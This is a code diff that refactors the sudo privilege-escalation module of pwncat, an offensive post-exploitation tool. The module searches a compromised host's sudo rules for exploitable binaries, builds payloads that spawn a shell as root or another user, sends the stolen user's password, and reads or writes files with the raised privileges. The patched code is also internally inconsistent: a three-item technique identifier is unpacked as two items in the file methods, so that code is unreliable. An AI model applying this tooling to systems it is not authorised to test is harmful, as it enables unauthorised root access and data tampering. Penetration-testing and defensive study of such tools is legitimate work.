@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from typing import Generator, List
+from typing import Generator, List, BinaryIO
 import shlex
 import sys
 from time import sleep
@@ -12,10 +12,8 @@ import functools
 from pwncat.util import CTRL_C
 from pwncat.privesc.base import Method, PrivescError, Technique
 from pwncat.file import RemoteBinaryPipe
-
 from pwncat.pysudoers import Sudoers
-from pwncat import gtfobins
-from pwncat.privesc import Capability
+from pwncat.gtfobins import Capability, Stream, Binary, SudoNotPossible
 from pwncat import util
 
 
@@ -168,44 +166,25 @@ class SudoMethod(Method):
             if current_user["password"] is None and sudo_privesc["password"]:
                 continue
 
-            try:
-                # Locate a GTFObins binary which satisfies the given sudo spec.
-                # The PtyHandler.which method is used to verify the presence of
-                # different GTFObins on the remote system when an "ALL" spec is
-                # found.
+            # Split the users on a comma
+            users = sudo_privesc["run_as_user"].split(",")
 
-                binaries = gtfobins.Binary.find_sudo(
-                    sudo_privesc["command"], self.pty.which, capability
-                )
-            except gtfobins.SudoNotPossible:
-                # No GTFObins possible with this sudo spec
-                continue
+            # We don't need to go anywhere else...
+            if "ALL" in users:
+                users = ["root"]
 
-            for binary in binaries:
-                command = sudo_privesc["command"]
-                if command == "ALL":
-                    command = binary.path
-                if sudo_privesc["run_as_user"] == "ALL":
-                    # add a technique for root
+            for method in self.pty.gtfo.iter_sudo(
+                sudo_privesc["command"], caps=capability
+            ):
+                for user in users:
                     techniques.append(
                         Technique(
-                            "root",
+                            user,
                             self,
-                            (binary, command, sudo_privesc["password"]),
-                            binary.capabilities,
+                            (method, sudo_privesc["command"], sudo_privesc["password"]),
+                            method.cap,
                         )
                     )
-                else:
-                    users = sudo_privesc["run_as_user"].split(",")
-                    for u in users:
-                        techniques.append(
-                            Technique(
-                                u,
-                                self,
-                                (binary, command, sudo_privesc["password"],),
-                                binary.capabilities,
-                            )
-                        )
 
         return techniques
 
@@ -214,56 +193,78 @@ class SudoMethod(Method):
 
         current_user = self.pty.current_user
 
-        binary, sudo_spec, password_required = technique.ident
+        # Extract the GTFObins method
+        method, sudo_spec, need_password = technique.ident
 
-        shell_payload, input, exit = binary.sudo_shell(
-            technique.user, sudo_spec, self.pty.shell
+        # Build the payload, input data, and exit command
+        payload, input_data, exit_command = method.build(
+            user=technique.user, shell=self.pty.shell, spec=sudo_spec
         )
 
         # Run the commands
-        self.pty.run(shell_payload + "\n", wait=False)
+        self.pty.process(payload, delim=True)
 
-        if password_required:
-            self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")
+        # This will check if the password is needed, and attempt to send it or
+        # fail, and return
+        self.send_password(current_user)
 
         # Provide stdin if needed
-        self.pty.client.send(input.encode("utf-8"))
+        self.pty.client.send(input_data.encode("utf-8"))
 
-        return exit
+        return exit_command
 
     def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
 
-        binary, sudo_spec, password_required = technique.ident
+        method, sudo_spec = technique.ident
 
-        read_payload = binary.read_file(
-            filepath, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
+        # Read the payload
+        payload, input_data, exit_command = method.build(
+            lfile=filepath, spec=sudo_spec, user=technique.user
         )
 
-        read_pipe = self.pty.run(
-            read_payload,
-            input=functools.partial(self.send_password, self.pty.current_user),
+        # Send the command and open a pipe
+        pipe = self.pty.subprocess(
+            payload,
+            "rb",
+            data=functools.partial(self.send_password, self.pty.current_user),
         )
 
-        return BytesIO(read_pipe)
+        # Send the input data required to initiate the transfer
+        if len(input_data) > 0:
+            self.pty.client.send(input_data.encode("utf-8"))
+
+        return method.wrap_stream(pipe, "rb")
 
     def write_file(self, filepath: str, data: bytes, technique: Technique):
 
-        binary, sudo_spec, password_required = technique.ident
-        payload = binary.write_file(
-            filepath, data, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
+        method, sudo_spec = technique.ident
+
+        # Build the payload
+        payload, input_data, exit_command = method.build(
+            lfile=filepath, spec=sudo_spec, user=technique.user
         )
 
-        # Run the commands
-        self.pty.run(
-            payload, input=functools.partial(self.send_password, self.pty.current_user),
+        # Send the command and open a pipe
+        pipe = self.pty.subprocess(
+            payload,
+            "wb",
+            data=functools.partial(self.send_password, self.pty.current_user),
         )
+
+        with method.wrap_stream(pipe, "wb", exit_command) as pipe:
+
+            # Send the input data required to initiate the transfer
+            if len(input_data) > 0:
+                pipe.write(input_data.encode("utf-8"))
+
+            pipe.write(data)
 
     def get_name(self, tech: Technique):
         """ Get the name of the given technique for display """
         return (
             (
                 f"{Fore.GREEN}{tech.user}{Fore.RESET} via "
-                f"{Fore.CYAN}{tech.ident[0].path}{Fore.RESET} "
+                f"{Fore.CYAN}{tech.ident[0].binary_path}{Fore.RESET} "
                 f"({Fore.RED}sudo{Fore.RESET}"
             )
             + (
